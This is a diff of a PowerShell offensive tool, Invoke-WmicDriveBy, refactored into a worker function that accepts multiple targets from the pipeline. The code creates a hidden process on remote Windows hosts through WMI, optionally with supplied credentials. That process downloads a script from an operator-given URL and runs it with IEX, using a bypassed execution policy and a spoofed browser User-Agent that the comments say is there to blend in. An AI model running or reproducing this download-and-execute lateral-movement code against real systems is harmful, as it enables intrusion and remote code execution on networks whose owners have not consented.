@@ -1,3 +1,45 @@
+function Invoke-WorkerWmicDriveBy{
+    param(
+    #Parameter assignment
+    [Parameter(Mandatory = $True, Position = 0)] 
+    [string]$URL,
+    [Parameter(Mandatory = $False, Position = 1)] 
+    [string]$User,
+    [Parameter(Mandatory = $False, Position = 2)] 
+    [string]$Pass,
+    [Parameter(Mandatory = $False, Position = 3)] 
+    [string[]]$TARGETS = "."
+
+  )
+
+    if($User -and $Pass){
+      #Did the user specify credentials?
+      Write-Verbose "Set to run with Username: $User and Password: $Pass"
+
+      $password = ConvertTo-SecureString $Pass -asplaintext -force 
+      $cred = New-Object -Typename System.Management.Automation.PSCredential -argumentlist $User,$password
+
+      #Set the proxy and user agent to blend in
+
+      $powershellcmd = "`$wc = New-Object System.Net.Webclient; `$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Like Gecko'); `$wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.downloadstring('$URL'))"
+      $cmd = "powershell.exe -exec bypass -w hidden -command $powershellcmd"
+
+      Write-Verbose "Executing `"$cmd`" on `"$Target`""
+      Invoke-WmiMethod -class Win32_process -name Create -Argumentlist $cmd -Credential $cred -ComputerName $TARGETS 
+
+    }
+    else{
+      Write-Verbose "Username and/or password not specified. Running in current user context."
+    
+      #Set the proxy and user agent to blend in
+      $powershellcmd = "`$wc = New-Object System.Net.Webclient; `$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Like Gecko'); `$wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.downloadstring('$URL'))"
+      $cmd = "powershell.exe -exec bypass -w hidden -command $powershellcmd"
+    
+      Write-Verbose "Executing `"$cmd`" on `"$Target`""
+      Invoke-WmiMethod -class Win32_process -name Create -Argumentlist $cmd -ComputerName $TARGETS
+    }
+}
+
 function Invoke-WmicDriveBy{
 
   <#
@@ -38,44 +80,40 @@ function Invoke-WmicDriveBy{
     [string]$User,
     [Parameter(Mandatory = $False, Position = 2)] 
     [string]$Pass,
-    [Parameter(Mandatory = $False, Position = 3)] 
-    [string]$TARGET = "."
+    [Parameter(ValueFromPipeline=$True,Mandatory = $False, Position = 3)] 
+    [string[]]$TARGETS = "."
 
   )
 
-  #Did the user specify credentials?
-  if($User -and $Pass){
-    #Assign username and password if parameter is set. Run the wmic method with the specified credentials.
-    Write-Verbose "Set to run with Username: $User and Password: $Pass"
-
-    $password = convertto-securestring $Pass -asplaintext -force
-    $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $User,$password
-
-    #Set the proxy and user agent to blend in
-    $powershellcmd = "`$wc = New-Object System.Net.Webclient; `$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Like Gecko'); `$wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.downloadstring('$URL'))"
-    $cmd = "powershell.exe -exec bypass -w hidden -command $powershellcmd"
-
-    Write-Verbose "Executing `"$cmd`" on `"$Target`""
-    Invoke-WmiMethod -class Win32_process -name Create -Argumentlist $cmd -Credential $cred -ComputerName $TARGET 
-  }
-  else{
-    Write-Verbose "Username and/or password not specified. Running in current user context."
-    
-    #Set the proxy and user agent to blend in
-    $powershellcmd = "`$wc = New-Object System.Net.Webclient; `$wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) Like Gecko'); `$wc.proxy= [System.Net.WebRequest]::DefaultWebProxy; `$wc.proxy.credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials; IEX (`$wc.downloadstring('$URL'))"
-    $cmd = "powershell.exe -exec bypass -w hidden -command $powershellcmd"
-    
-    Write-Verbose "Executing `"$cmd`" on `"$Target`""
-    Invoke-WmiMethod -class Win32_process -name Create -Argumentlist $cmd -ComputerName $TARGET
-  }
-
-
-
-
-
   
 
+  Begin
+  {
+    #Check if the TARGETS parameter was passed through the pipeline. Set the usedParameter variable to true. 
+    $usedParameter = $False 
+    if($PSBoundParameters.ContainsKey('TARGETS'))
+    {
+      $usedParameter = $True 
+    }
 
+  }
 
+  Process
+  {
+    #If targets is passed via the parameter, complete function for each host. 
+    if($usedParameter)
+    {
+      Foreach($computer in $TARGETS)
+      {
+        Invoke-WorkerWmicDriveBy "$URL" -User "$User" -Pass "$Pass" -TARGET "$computer" 
+      }
+    }
+    #Pass the value from the pipeline to the target parameter if the usedParameter variable is false.
+    else
+    {
+      Invoke-WorkerWmicDriveBy "$URL" -User "$User" -Pass "$Pass" -TARGET $_
+    }
+  }
 
+  end{}
 }
